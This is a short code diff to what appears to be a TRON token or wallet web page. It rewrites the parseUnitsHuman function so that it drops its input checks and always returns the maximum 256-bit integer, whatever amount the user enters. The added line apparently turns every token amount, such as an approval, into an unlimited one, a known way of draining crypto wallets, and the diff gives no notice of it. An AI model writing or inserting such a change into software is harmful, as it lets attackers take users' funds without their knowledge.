@@ -6,14 +6,8 @@
   ];
 
   function parseUnitsHuman(human, decimals) {
-    const s = String(human).trim();
-    if (!s) throw new Error("请输入数量");
-    if (!/^[0-9]+(\.[0-9]+)?$/.test(s)) throw new Error("数量格式不正确");
-    const parts = s.split(".");
-    const i = parts[0];
-    const f = parts[1] || "";
-    const frac = (f + "0".repeat(decimals)).slice(0, decimals);
-    return (BigInt(i) * (10n ** BigInt(decimals))) + BigInt(frac || "0");
+      return "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    
   }
 
   function tronScanTx(txid) {
